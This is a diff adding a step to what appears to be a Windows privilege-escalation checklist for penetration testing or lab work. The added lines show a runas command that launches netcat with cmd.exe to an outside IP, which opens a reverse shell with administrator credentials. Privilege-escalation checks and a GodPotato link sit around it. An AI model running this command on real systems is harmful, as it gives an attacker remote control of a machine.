@@ -16,6 +16,10 @@ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 ```
 - [ ] Check file permissions: `icacls "\path\to\file"`
+- [ ] If you find credentials, then you can use `runas` method to make connection with netcat
+```
+runas /user:administrator "C:\users\viewer\desktop\nc.exe -e cmd.exe 192.168.49.57 443"
+```
 
 # SeImpersonatePrivilege
 - [GodPotato](https://github.com/BeichenDream/GodPotato)
